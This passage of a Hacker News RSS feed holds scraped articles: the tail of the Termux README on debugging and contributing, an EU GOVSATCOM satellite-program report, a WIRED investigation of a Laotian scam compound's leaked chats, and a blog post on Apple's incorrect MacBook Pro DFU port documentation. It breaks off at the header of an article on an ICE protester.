<p dir="auto">You can help debug problems of the <code>Termux</code> app and its plugins by setting appropriate <code>logcat</code> <code>Log Level</code> in <code>Termux</code> app settings -&gt; <code>&lt;APP_NAME&gt;</code> -&gt; <code>Debugging</code> -&gt; <code>Log Level</code> (Requires <code>Termux</code> app version <code>&gt;= 0.118.0</code>). The <code>Log Level</code> defaults to <code>Normal</code> and log level <code>Verbose</code> currently logs additional information. Its best to revert log level to <code>Normal</code> after you have finished debugging since private data may otherwise be passed to <code>logcat</code> during normal operation and moreover, additional logging increases execution time.</p>
<p dir="auto">The plugin apps <strong>do not execute the commands themselves</strong> but send execution intents to <code>Termux</code> app, which has its own log level which can be set in <code>Termux</code> app settings -&gt; <code>Termux</code> -&gt; <code>Debugging</code> -&gt; <code>Log Level</code>. So you must set log level for both <code>Termux</code> and the respective plugin app settings to get all the info.</p>
<p dir="auto">Once log levels have been set, you can run the <code>logcat</code> command in <code>Termux</code> app terminal to view the logs in realtime (<code>Ctrl+c</code> to stop) or use <code>logcat -d &gt; logcat.txt</code> to take a dump of the log. You can also view the logs from a PC over <code>ADB</code>. For more information, check official android <code>logcat</code> guide <a href="https://developer.android.com/studio/command-line/logcat" rel="nofollow">here</a>.</p>
<p dir="auto">Moreover, users can generate termux files <code>stat</code> info and <code>logcat</code> dump automatically too with terminal's long hold options menu <code>More</code> -&gt; <code>Report Issue</code> option and selecting <code>YES</code> in the prompt shown to add debug info. This can be helpful for reporting and debugging other issues. If the report generated is too large, then <code>Save To File</code> option in context menu (3 dots on top right) of <code>ReportActivity</code> can be used and the file viewed/shared instead.</p>
<p dir="auto">Users must post complete report (optionally without sensitive info) when reporting issues. Issues opened with <strong>(partial) screenshots of error reports</strong> instead of text will likely be automatically closed/deleted.</p>
<p dir="auto"><h5 tabindex="-1" dir="auto">Log Levels</h5><a id="user-content-log-levels" aria-label="Permalink: Log Levels" href="#log-levels"></a></p>
<ul dir="auto">
<li><code>Off</code> - Log nothing.</li>
<li><code>Normal</code> - Start logging error, warn and info messages and stacktraces.</li>
<li><code>Debug</code> - Start logging debug messages.</li>
<li><code>Verbose</code> - Start logging verbose messages.</li>
</ul>

<p dir="auto"><h2 tabindex="-1" dir="auto">For Maintainers and Contributors</h2><a id="user-content-for-maintainers-and-contributors" aria-label="Permalink: For Maintainers and Contributors" href="#for-maintainers-and-contributors"></a></p>
<p dir="auto">The <a href="https://github.com/termux/termux-app/blob/master/termux-shared">termux-shared</a> library was added in <a href="https://github.com/termux/termux-app/releases/tag/v0.109"><code>v0.109</code></a>. It defines shared constants and utils of the Termux app and its plugins. It was created to allow for the removal of all hardcoded paths in the Termux app. Some of the termux plugins are using this as well and rest will in future. If you are contributing code that is using a constant or a util that may be shared, then define it in <code>termux-shared</code> library if it currently doesn't exist and reference it from there. Update the relevant changelogs as well. Pull requests using hardcoded values <strong>will/should not</strong> be accepted. Termux app and plugin specific classes must be added under <code>com.termux.shared.termux</code> package and general classes outside it. The <a href="https://github.com/termux/termux-app/blob/master/termux-shared/LICENSE.md"><code>termux-shared</code> <code>LICENSE</code></a> must also be checked and updated if necessary when contributing code. The licenses of any external library or code must be honoured.</p>
<p dir="auto">The main Termux constants are defined by <a href="https://github.com/termux/termux-app/blob/master/termux-shared/src/main/java/com/termux/shared/termux/TermuxConstants.java"><code>TermuxConstants</code></a> class. It also contains information on how to fork Termux or build it with your own package name. Changing the package name will require building the bootstrap zip packages and other packages with the new <code>$PREFIX</code>, check <a href="https://github.com/termux/termux-packages/wiki/Building-packages">Building Packages</a> for more info.</p>
<p dir="auto">Check <a href="https://github.com/termux/termux-app/wiki/Termux-Libraries">Termux Libraries</a> for how to import termux libraries in plugin apps and <a href="https://github.com/termux/termux-app/wiki/Termux-Libraries#forking-and-local-development">Forking and Local Development</a> for how to update termux libraries for plugins.</p>
<p dir="auto">The <code>versionName</code> in <code>build.gradle</code> files of Termux and its plugin apps must follow the <a href="https://semver.org/spec/v2.0.0.html" rel="nofollow">semantic version <code>2.0.0</code> spec</a> in the format <code>major.minor.patch(-prerelease)(+buildmetadata)</code>. When bumping <code>versionName</code> in <code>build.gradle</code> files and when creating a tag for new releases on GitHub, make sure to include the patch number as well, like <code>v0.1.0</code> instead of just <code>v0.1</code>. The <code>build.gradle</code> files and <code>attach_debug_apks_to_release</code> workflow validates the version as well and the build/attachment will fail if <code>versionName</code> does not follow the spec.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Commit Messages Guidelines</h3><a id="user-content-commit-messages-guidelines" aria-label="Permalink: Commit Messages Guidelines" href="#commit-messages-guidelines"></a></p>
<p dir="auto">Commit messages <strong>must</strong> use the <a href="https://www.conventionalcommits.org/" rel="nofollow">Conventional Commits</a> spec so that chagelogs as per the <a href="https://github.com/olivierlacan/keep-a-changelog">Keep a Changelog</a> spec can automatically be generated by the <a href="https://github.com/termux/create-conventional-changelog"><code>create-conventional-changelog</code></a> script, check its repo for further details on the spec. <strong>The first letter for <code>type</code> and <code>description</code> must be capital and description should be in the present tense.</strong> The space after the colon <code>:</code> is necessary. For a breaking change, add an exclamation mark <code>!</code> before the colon <code>:</code>, so that it is highlighted in the chagelog automatically.</p>
<div data-snippet-clipboard-copy-content="<type>[optional scope]: <description>

[optional body]

[optional footer(s)]"><pre><code>&lt;type&gt;[optional scope]: &lt;description&gt;

[optional body]

[optional footer(s)]
</code></pre></div>
<p dir="auto"><strong>Only the <code>types</code> listed below must be used exactly as they are used in the changelog headings.</strong> For example, <code>Added: Add foo</code>, <code>Added|Fixed: Add foo and fix bar</code>, <code>Changed!: Change baz as a breaking change</code>, etc. You can optionally add a scope as well, like <code>Fixed(terminal): Fix some bug</code>. <strong>Do not use anything else as type, like <code>add</code> instead of <code>Added</code>, etc.</strong></p>
<ul dir="auto">
<li><strong>Added</strong> for new features.</li>
<li><strong>Changed</strong> for changes in existing functionality.</li>
<li><strong>Deprecated</strong> for soon-to-be removed features.</li>
<li><strong>Removed</strong> for now removed features.</li>
<li><strong>Fixed</strong> for any bug fixes.</li>
<li><strong>Security</strong> in case of vulnerabilities.</li>
</ul>

<p dir="auto"><h2 tabindex="-1" dir="auto">Forking</h2><a id="user-content-forking" aria-label="Permalink: Forking" href="#forking"></a></p>
<ul dir="auto">
<li>Check <a href="https://github.com/termux/termux-app/blob/master/termux-shared/src/main/java/com/termux/shared/termux/TermuxConstants.java"><code>TermuxConstants</code></a> javadocs for instructions on what changes to make in the app to change package name.</li>
<li>You also need to recompile bootstrap zip for the new package name. Check <a href="https://github.com/termux/termux-packages/wiki/For-maintainers#build-bootstrap-archives">building bootstrap</a>, <a href="https://github.com/termux/termux-app/issues/1983" data-hovercard-type="issue" data-hovercard-url="/termux/termux-app/issues/1983/hovercard">here</a> and <a href="https://github.com/termux/termux-app/issues/2081#issuecomment-865280111" data-hovercard-type="issue" data-hovercard-url="/termux/termux-app/issues/2081/hovercard">here</a>.</li>
<li>Currently, not all plugins use <code>TermuxConstants</code> from <code>termux-shared</code> library and have hardcoded <code>com.termux</code> values and will need to be manually patched.</li>
<li>If forking termux plugins, check <a href="https://github.com/termux/termux-app/wiki/Termux-Libraries#forking-and-local-development">Forking and Local Development</a> for info on how to use termux libraries for plugins.</li>
</ul>

<p dir="auto"><h2 tabindex="-1" dir="auto">Sponsors and Funders</h2><a id="user-content-sponsors-and-funders" aria-label="Permalink: Sponsors and Funders" href="#sponsors-and-funders"></a></p>
<p dir="auto"><a href="https://github.com/"><img alt="GitHub Accelerator" width="25%" src="https://github.com/termux/termux-app/raw/master/site/assets/sponsors/github.png"></a><br>
<em><a href="https://github.com/accelerator">GitHub Accelerator</a> (<a href="https://github.blog/2023-04-12-github-accelerator-our-first-cohort-and-whats-next" rel="nofollow">1</a>)</em></p>

<p dir="auto"><a href="https://github.com/"><img alt="GitHub Secure Open Source Fund" width="25%" src="https://github.com/termux/termux-app/raw/master/site/assets/sponsors/github.png"></a><br>
<em><a href="https://resources.github.com/github-secure-open-source-fund">GitHub Secure Open Source Fund</a> (<a href="https://github.blog/open-source/maintainers/securing-the-supply-chain-at-scale-starting-with-71-important-open-source-projects" rel="nofollow">1</a>, <a href="https://termux.dev/en/posts/general/2025/08/11/termux-selected-for-github-secure-open-source-fund-session-2.html" rel="nofollow">2</a>)</em></p>

<p dir="auto"><a href="https://nlnet.nl/mobifree" rel="nofollow"><img alt="NLnet NGI Mobifree" width="25%" src="https://github.com/termux/termux-app/raw/master/site/assets/sponsors/nlnet-ngi-mobifree.png"></a><br>
<em><a href="https://nlnet.nl/mobifree" rel="nofollow">NLnet NGI Mobifree</a> (<a href="https://nlnet.nl/news/2024/20241111-NGI-Mobifree-grants.html" rel="nofollow">1</a>, <a href="https://termux.dev/en/posts/general/2024/11/11/termux-selected-for-nlnet-ngi-mobifree-grant.html" rel="nofollow">2</a>)</em></p>

<p dir="auto"><a href="https://www.cloudflare.com/" rel="nofollow"><img alt="Cloudflare" width="25%" src="https://github.com/termux/termux-app/raw/master/site/assets/sponsors/cloudflare.png"></a><br>
<em><a href="https://www.cloudflare.com/" rel="nofollow">Cloudflare</a> (<a href="https://packages-cf.termux.dev/" rel="nofollow">1</a>)</em></p>

<p dir="auto"><a href="https://www.warp.dev/?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=termux" rel="nofollow"><img alt="Warp" width="25%" src="https://github.com/warpdotdev/brand-assets/raw/640dffd347439bbcb535321ab36b7281cf4446c0/Github/Sponsor/Warp-Github-LG-03.png"></a><br>
<a href="https://www.warp.dev/?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=termux" rel="nofollow"><em>Warp, built for coding with multiple AI agents</em></a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[EU launches government satcom program in sovereignty push (121 pts)]]></title>
            <link>https://spacenews.com/eu-launches-government-satcom-program-in-sovereignty-push/</link>
            <guid>46853888</guid>
            <pubDate>Mon, 02 Feb 2026 08:59:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spacenews.com/eu-launches-government-satcom-program-in-sovereignty-push/">https://spacenews.com/eu-launches-government-satcom-program-in-sovereignty-push/</a>, See on <a href="https://news.ycombinator.com/item?id=46853888">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="content">
		<main id="main">

			
	

	
			<figure>

				<img width="1200" height="800" src="https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?fit=1200%2C800&amp;ssl=1" alt="Kubilius" data-hero-candidate="1" fetchpriority="high" decoding="async" srcset="https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?w=2560&amp;ssl=1 2560w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=1536%2C1024&amp;ssl=1 1536w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=2048%2C1366&amp;ssl=1 2048w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=1200%2C800&amp;ssl=1 1200w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=2000%2C1334&amp;ssl=1 2000w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=780%2C520&amp;ssl=1 780w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=400%2C267&amp;ssl=1 400w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?resize=706%2C471&amp;ssl=1 706w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?w=2340&amp;ssl=1 2340w, https://i0.wp.com/spacenews.com/wp-content/uploads/2025/07/P067364-774808-scaled.jpeg?fit=1200%2C800&amp;ssl=1&amp;w=370 370w" sizes="(max-width: 1200px) 100vw, 1200px">			<figcaption><span>European Commissioner for Defence and Space Andrius Kubilius discusses the new EU Space Act at a June 25 briefing. <span><span>Credit:</span> EC Audiovisual Service</span></span></figcaption>
			
			</figure><!-- .post-thumbnail -->

		
				<div>

					

<article id="post-569116">
	<div>

		
		
<p>BRUSSELS —&nbsp; The European Union’s new government satellite communications program, GOVSATCOM, which pools capacity from eight already on-orbit geosynchronous satellites, began operations last week, European Commissioner for Defence and Space Andrius Kubilius said Jan. 27.</p>

<p>The program is designed to provide secure communications capabilities to the EU and its member states and could expand by 2027, Kubilius said.</p>

<p>“Last week we started GOVSATCOM operations,” Kubilius said during his opening remarks at the European Space Conference. “That means that all member states can now have access to sovereign satellite communications — military and government, secure and resilient, built in Europe, operated in Europe, and under European control.”</p>

<p>Specifically, Kubilius was referring to the GOVSATCOM hub, a “marketplace” of governmental capacities from the five resource providers currently enrolled in the program. Juan Ramon Lopez Caravantes, head of communication at the European Union Agency for the Space Programme, said that with ”a few clicks member states can now introduce their service request. It’s an easy to use, smooth running secure platform”.</p>

<p>GOVSATCOM is conceived as a “system of systems,” merging existing national and commercial satellite capacities into a common EU pool. The program is structured in multiple phases, and is pooling capacity from eight existing, already-in-orbit GEO satellites from five member states — France, Spain, Italy, Greece and Luxembourg.&nbsp;</p>


<p>“They currently offer 35 different service programs from a catalogue that is not public. It’s only for the member states, and it’s fully secured and encrypted” added Jeremie Godet, head of unit secure connectivity and space surveillance at European Commission’s Directorate General office for defence industry and space. “The coverage is currently from the south of Greenland to South America on the west and up to India on the East.” </p>

<p>In 2027 this catalog will expand, Godet added, to fill gaps and to secure more commercial satcom solutions.&nbsp;</p>

<p>Beginning in 2029, GOVSATCOM is expected to integrate with the 290 satellites in the&nbsp; <a href="https://spacenews.com/europe-signs-contracts-for-iris%c2%b2-constellation/">Infrastructure for Resilience, Interconnectivity and Security by Satellite </a>constellation, known as <a href="https://spacenews.com/europe-signs-contracts-for-iris%c2%b2-constellation/">IRIS²</a>, and be fully operational. </p>

<p>“The goal”, Kubilius said during the conference “is to have expanded commercial capabilities operational by 2027, including expanding coverage, and expanding bandwidth to cover the entire world,” and to support IRIS² by 2029. </p>

<p>Concerning IRIS<sup>2</sup>, the commissioner also said that IRIS² Ka-band military frequencies were brought into use last week. He expressed confidence that the first batch of satellites will be ready for deployment by 2029. “I have asked all partners to step up and speed up IRIS²,“and I’m confident we can deploy its initial services by 2029,” he said. </p>

<p>“The goal is connectivity and security for all of Europe — guaranteed access for all member states and full European control.”</p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

	
			<div>
					<!-- .author-bio-header -->

											<p>
							Emma Gatti is a planetary scientist, editor and journalist, and serves as a research professor in Space Journalism and Current Affairs at the Faculty of Space Technology, AGH University of Krakow. She is also the director of The Space Republic, a media...															<a href="https://spacenews.com/author/emma-gatti/" rel="author">
								More by Emma Gatti								</a>
													</p>
					
				</div><!-- .author-bio -->
			
</article><!-- #post-${ID} -->

	<nav aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>


				</div><!-- .main-content -->

			
<!-- #secondary -->

		</main><!-- #main -->
	</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Leaked Chats Expose the Daily Life of a Scam Compound's Enslaved Workforce (230 pts)]]></title>
            <link>https://www.wired.com/story/the-red-bull-leaks/</link>
            <guid>46852660</guid>
            <pubDate>Mon, 02 Feb 2026 05:10:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wired.com/story/the-red-bull-leaks/">https://www.wired.com/story/the-red-bull-leaks/</a>, See on <a href="https://news.ycombinator.com/item?id=46852660">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><span>Just before 8am</span> one day last April, an office manager who went by the name Amani sent out a motivational message to his colleagues and subordinates. “Every day brings a new opportunity—a chance to connect, to inspire, and to make a difference,” he wrote in his 500-word post to an office-wide WhatsApp group. “Talk to that next customer like you're bringing them something valuable—because you are.”</p><p>Amani wasn’t rallying a typical corporate sales team. He and his underlings worked inside a “<a href="https://www.wired.com/story/what-is-pig-butchering-scam/">pig butchering</a>” compound, a criminal operation built to carry out <a href="https://www.wired.com/tag/scams/">scams</a>—promising romance and riches from <a href="https://www.wired.com/tag/cryptocurrency/">crypto</a> investments—that <a href="https://www.wired.com/story/pig-butchering-scam-invasion/">often</a> defraud victims out of hundreds of thousands or even millions of dollars at a time.</p><div data-testid="GenericCallout"><p><span><picture><img alt="Image may contain: City, Road, Street, Urban, Plant, Vegetation, Person, Walking, Palm Tree, Tree, Path, Helmet, and Outdoors" loading="lazy" srcset="https://media.wired.com/photos/695d063065851e41961fe045/master/w_120,c_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg 120w, https://media.wired.com/photos/695d063065851e41961fe045/master/w_240,c_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg 240w, https://media.wired.com/photos/695d063065851e41961fe045/master/w_320,c_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg 320w, https://media.wired.com/photos/695d063065851e41961fe045/master/w_640,c_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg 640w" sizes="100vw" src="https://media.wired.com/photos/695d063065851e41961fe045/master/w_775%2Cc_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg"></picture></span></p><div><p>Read the full story of WIRED's source, Mohammad Muzahir, <a href="https://www.wired.com/story/he-leaked-the-secrets-southeast-asian-scam-compound-then-had-to-get-out-alive">here</a>.</p></div></div><p>The workers Amani was addressing were eight hours into their 15-hour night shift in a high-rise building in the Golden Triangle special economic zone in Northern Laos. Like their marks, most of them were victims, too: forced laborers trapped in the compound, held in debt bondage with no passports. They struggled to meet scam revenue quotas to avoid fines that deepened their debt. Anyone who broke rules or attempted to escape faced far worse consequences: beatings, torture, even death.</p><p>The bizarre reality of daily life in a Southeast Asian scam compound—the tactics, the tone, the mix of cruelty and upbeat corporate prattle—is revealed at an unprecedented level of resolution in a leak of documents to WIRED from a whistleblower inside one such sprawling fraud operation. The facility, known as the Boshang compound, is one of dozens of scam operations across Southeast Asia that have enslaved hundreds of thousands of people. Often lured from the poorest regions of Asia and Africa with fake job offers, these conscripts have become engines of the most lucrative form of cybercrime in the world, coerced into stealing tens of billions of dollars.</p><p>Last June, one of those forced laborers, an Indian man named Mohammad Muzahir, contacted WIRED while he was still captive inside the scam compound that had trapped him. Over the following weeks, Muzahir, who initially identified himself only as “Red Bull,” shared with WIRED a trove of information about the scam operation. His leaks included internal documents, scam scripts, training guides, operational flowcharts, and photographs and videos from inside the compound.</p><p>Of all Muzahir’s leaks, the most revealing is a collection of screen recordings in which he scrolled through three months’ worth of the compound’s internal WhatsApp group chats. Those videos, which WIRED converted into 4,200 pages of screenshots, capture hour-by-hour conversations between the compound’s workers and their bosses—and the nightmare workplace culture of a pig butchering organization.</p><p>“It’s a slave colony that’s trying to pretend it’s a company,” says Erin West, a former Santa Clara County, California, prosecutor who leads an anti-scam organization called Operation Shamrock and who reviewed the chat logs obtained by WIRED. Another researcher who reviewed the leaked chat logs, Jacob Sims of Harvard University’s Asia Center, also remarked on their “Orwellian veneer of legitimacy.”</p><p>“It’s terrifying, because it’s manipulation <em>and</em> coercion,” says Sims, who studies Southeast Asian scam compounds. “Combining those two things together motivates people the most. And it’s one of the key reasons why these compounds are so profitable.”</p><p>In another chat message, sent within hours of Amani’s saccharine pep talk, a higher-level boss weighed in: “Don't resist the company's rules and regulations,” he wrote. “Otherwise you can't survive here.” The staffers responded with 26 emoji reactions, all thumbs-ups and salutes.</p><div data-testid="GenericCallout"><figure><p><span><picture><img alt="Image may contain Head Person Face Adult Crew Cut Hair Beard Photography and Portrait" loading="lazy" srcset="https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_120,c_limit/_SMK7032%20copy.jpg 120w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_240,c_limit/_SMK7032%20copy.jpg 240w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_320,c_limit/_SMK7032%20copy.jpg 320w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_640,c_limit/_SMK7032%20copy.jpg 640w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_960,c_limit/_SMK7032%20copy.jpg 960w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_1280,c_limit/_SMK7032%20copy.jpg 1280w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_1600,c_limit/_SMK7032%20copy.jpg 1600w" sizes="100vw" src="https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_1600%2Cc_limit/_SMK7032%2520copy.jpg"></picture></span></p><p><span><p>Scam compound whistleblower Mohammad Muzahir, photographed in India after returning home from his ordeal as a forced laborer in the Golden Triangle.</p>
</span><span>Photograph: Saumya Khandelwal</span></p></figure></div><h2><strong>Fined Into Slavery</strong></h2><p><span>In total, according</span> to WIRED’s analysis of the group chat, more than 30 of the compound’s workers successfully defrauded at least one victim in the 11 weeks of records available, totaling to around $2.2 million in stolen funds. Yet the bosses in the chat frequently voiced their disappointment in the group’s performance, berated the staff for lack of effort, and imposed fine after fine.</p><p>Rather than explicit imprisonment, the compound relied on a system of indentured servitude and debt to control its workers. As Muzahir described it, he was paid a base salary of 3,500 Chinese yuan a month (about $500), which in theory entailed 75 hours a week of night shifts including breaks to eat. Although his passport had been taken from him, he was told that if he could pay off his “contract” with a $5,400 payment, it would be returned to him and he would be allowed to leave.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple's MacBook Pro DFU port documentation is wrong (160 pts)]]></title>
            <link>https://lapcatsoftware.com/articles/2026/2/1.html</link>
            <guid>46852096</guid>
            <pubDate>Mon, 02 Feb 2026 03:29:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lapcatsoftware.com/articles/2026/2/1.html">https://lapcatsoftware.com/articles/2026/2/1.html</a>, See on <a href="https://news.ycombinator.com/item?id=46852096">Hacker News</a></p>
<div id="readability-page-1" class="page">
<nav>
Previous: <a href="https://lapcatsoftware.com/articles/2026/1/10.html">How do you comparison shop in the App Store?</a>
<br><a href="https://lapcatsoftware.com/articles/index.html" title="The Desolation of Blog">Articles index</a></nav>
<header><a href="https://lapcatsoftware.com/">Jeff Johnson</a> (<a href="https://underpassapp.com/">My apps</a>, <a href="https://www.paypal.me/JeffJohnsonWI">PayPal.Me</a>, <a href="https://mastodon.social/@lapcatsoftware" title="@lapcatsoftware@mastodon.social">Mastodon</a>)</header>

<h3>February 1 2026</h3>

<p>According to the Apple support document <a href="https://support.apple.com/120694">How to identify the DFU port on Mac</a>, the DFU (device firmware update) port location for MacBook Pro models with Apple silicon is as follows:</p>
<blockquote>
<ul><li><p><a href="https://support.apple.com/121552">14-inch MacBook Pro with M4 or M5 chip</a>: The rightmost USB-C port when you’re facing the left side of the Mac</p></li></ul>
<ul><li><p>All other models: The leftmost USB-C port when you’re facing the left side of the Mac</p></li></ul>
</blockquote>
<p>This is wrong, a discovery that took me about a half dozen attempts to update macOS on an external disk. I have a 16-inch MacBook Pro with an M4 chip, specifically an M4 Pro chip, and the DFU port seems to be the USB-C port on the <em>right</em> side of the Mac, not on the left side.</p>
<p>For some damn reason, it matters which port your external disk is plugged into when you install or update macOS, as described by the Apple support document <a href="https://support.apple.com/111336">How to use an external storage device as a Mac startup disk</a>:</p>
<blockquote>
<p>Make sure that your storage device is plugged into the appropriate port on your Mac.</p>
<ul><li><p>If you're using a <a href="https://support.apple.com/116943">Mac with Apple silicon</a>, plug your storage device into any compatible port except the DFU port. <a href="https://support.apple.com/120694">Learn how to identify the DFU port</a>. After macOS installation is complete, you can connect your storage device to any compatible port, including the DFU port.</p></li><li><p>If you’re using any other Mac, plug your storage device into any compatible port.</p></li></ul>
</blockquote>
<p>Mac disk management was so much easier in the days of Intel and PowerPC!</p>
<p>On an external SSD I had installed a macOS Sequoia boot volume (among others), which I’ve used to take Mac App Store screenshots for <a href="https://apps.apple.com/developer/jeff-johnson/id1176742298">my apps</a> and which I’d now like to use to take a screen recording. The installed version was still macOS 15.2, because I don’t often boot into the disk to take new screenshots, and going through the software update process would occupy my MacBook Pro for annoyingly long. However, it appears that Safari 26 requires a version of macOS 15 higher than .2, so I needed to update macOS in order to update Safari from version 18.</p>
<p>Over the past few days, every attempt I made to update the disk volume to macOS 15.7.3 failed inexplicably. I tried both Software Update in System Settings and the <code>softwareupdate</code> command-line tool in Terminal. They went through all the motions, downloading the entire update, rebooting, etc., but afterwards I always ended up right where I started, at macOS 15.2. The <code>softwareupdate</code> tool gave no error message. I did eventually see the following (truncated) notification:</p>
<p><img src="https://lapcatsoftware.com/articles/2026/2/1.png" width="379" height="86" alt="Some updates could not be installed"></p>
<p>Nonetheless, the so-called “Details” button presented no actual details, simply opening Software Update again in System Settings. At no point did it ever say, hey, plug your disk into a different port!</p>
<p>While searching for a solution to my problem, I found an article by Michael Tsai, <a href="https://mjtsai.com/blog/2025/04/11/failed-software-update-on-the-external-drive-of-an-apple-silicon-mac/">Failed Software Update on the External Drive of an Apple Silicon Mac</a>. It described something that I also saw in my testing:</p>
<blockquote>I happened to boot into macOS Recovery and look in the Startup Security Utility, and I saw that it did not have access to change the security policy for the external drive. In order to do that, it said I had to set the drive as the startup disk. This kind of didn’t make sense because don’t the security options get set when booted from Recovery?</blockquote>
<p>I followed Tsai’s instructions, which did allow me to change the security policy for the external drive.</p>
<blockquote>I don’t know why software update couldn’t tell me this or why there is seemingly no direct GUI command to view or edit the authorized users. But restarting <em>from within</em> <strong>Startup Disk</strong> is apparently the way to get macOS to offer to fix the LocalPolicy. Once I added the user, I was able to do a normal boot from the external drive and software update normally.</blockquote>
<p>I also thought this would solve my macOS update problem, but it didn’t. In retrospect, though, perhaps I needed <em>both</em> solutions, to fix the LocalPolicy and to change the ports.</p>
<p>I was about to surrender to despair when I discovered a second article by Michael Tsai, <a href="https://mjtsai.com/blog/2025/04/29/failing-to-finish-updating-macos-on-an-external-disk/">Failing to Finish Updating macOS on an External Disk</a>, published soon after the first article:</p>
<blockquote>With the final release of macOS 15.5, the problem got worse, and the Startup Disk workaround no longer helps.</blockquote>
<p>Tsai ultimately hits on the solution:</p>
<blockquote>The problem ended up being that I had plugged the external drive into the wrong USB-C port (the <a href="https://support.apple.com/en-us/120694">DFU port</a>).</blockquote>
<p>Sure enough, after plugging my disk into a port on the left side of my MacBook Pro, software update succeeded on the first attempt. Every previous, failed attempt used the port on the right side, which was physically more convenient on the desk. So after all that, the external disk is finally updated to macOS 15.7.3 now.</p>
<p>Tsai offers the same complaint about this absurd situation:</p>
<blockquote>I don’t know why macOS can’t just report an error when you use the wrong port instead of proceeding to install for an hour and then not report an error but not work, either.</blockquote>
<p>By the way, Software Update in System Settings allowed my Mac to go to sleep during the “Preparing” phase, despite the fact that the battery was charged to 99%, so when I returned home from a workout I unhappily found 30 minutes remaining. Sigh. Whatever happened to “it just works”?</p>

<header><a href="https://lapcatsoftware.com/">Jeff Johnson</a> (<a href="https://underpassapp.com/">My apps</a>, <a href="https://www.paypal.me/JeffJohnsonWI">PayPal.Me</a>, <a href="https://mastodon.social/@lapcatsoftware" title="@lapcatsoftware@mastodon.social">Mastodon</a>)</header>
<nav><a href="https://lapcatsoftware.com/articles/index.html" title="The Desolation of Blog">Articles index</a><br>
Previous: <a href="https://lapcatsoftware.com/articles/2026/1/10.html">How do you comparison shop in the App Store?</a>
</nav>


</div>]]></description>
        </item>
        <item>
            <title><![CDATA[ICE protester says her Global Entry was revoked after agent scanned her face (137 pts)]]></title>
            <link>https://arstechnica.com/tech-policy/2026/01/ice-protester-says-her-global-entry-was-revoked-after-agent-scanned-her-face/</link>
            <guid>46852073</guid>
            <pubDate>Mon, 02 Feb 2026 03:25:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/tech-policy/2026/01/ice-protester-says-her-global-entry-was-revoked-after-agent-scanned-her-face/">https://arstechnica.com/tech-policy/2026/01/ice-protester-says-her-global-entry-was-revoked-after-agent-scanned-her-face/</a>, See on <a href="https://news.ycombinator.com/item?id=46852073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="app">
    <p><a href="#main">
  Skip to content
</a></p>



<main id="main">
            <article data-id="2138571">
  
  <header>
  <div>
    <div>
      <div>
        <p><span>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><defs><clipPath id="section-tech-policy_svg__a"><path fill="none" d="M0 0h40v40H0z"></path></clipPath><clipPath id="section-tech-policy_svg__b"><path fill="none" d="M0 0h40v40H0z"></path></clipPath></defs><g clip-path="url(#section-tech-policy_svg__a)"><path fill="currentColor" d="M12.8 0 6.4 6.4 0 12.8l4 1.4L14.2 4z"></path><g clip-path="url(#section-tech-policy_svg__b)"><path fill="currentColor" d="M34.8 31.7c-4.4-10.4-6.1-23.6-6.1-23.6L15.4 5.4l-9.9 10 2.7 13.3s13.2 1.6 23.6 6.1c-.4 1.4 0 2.9 1.1 4 1.4 1.4 3.6 1.6 5.2.6L18.5 19.8c-1.6 1-3.8.8-5.2-.6-1.6-1.6-1.6-4.3 0-5.9s4.3-1.6 5.9 0c1.4 1.4 1.6 3.6.6 5.2L39.3 38c1-1.6.8-3.8-.6-5.2-1.1-1.1-2.6-1.4-4-1.1"></path></g></g></svg>
  </span>
  <span>
    “This is intimidation and retaliation”
  </span>
</p>
      </div>

      

      <p>
